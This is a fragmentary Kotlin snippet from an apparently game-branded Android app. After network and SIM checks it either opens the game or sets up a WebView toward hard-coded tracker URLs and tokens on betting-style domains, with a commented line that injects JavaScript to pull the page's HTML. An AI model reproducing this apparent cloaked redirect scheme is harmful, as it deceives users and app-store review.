            ...
            override fun onFinish() {
                ...
                if(isWorkingInternetPersent()){
                    if (sim){
                        ...
                        val i = Intent(applicationContext, GameMainActivity::class.java)
                        startActivity(i)
                        finish()
                    }
...
//                    web.loadUrl("javascript:window.HTMLOUT.processHTML('<head>'+document.getElementsByTagName('html')[0].innerHTML+'</head>');")
                        ...
                        //https://betwinnef.com/BtymF7/click_api/v3?token=d8x9vlmvxl7gzbxjt5k4gjghnkssjmt9&log=1&info=1

//                        val token = "wfwcqg6rxcv6p6srcv2gfd3qzdsybwy2"
//                        val tracker = "https://pomidorkins.store/MF8C2z"
                        val token = "d8x9vlmvxl7gzbxjt5k4gjghnkssjmt9"
                        val tracker = "https://betwinnef.com/BtymF7"

                        val serverURL = "https://betwinnef.com/BtymF7/click_api/v3?token=d8x9vlmvxl7gzbxjt5k4gjghnkssjmt9&log=1&info=1"
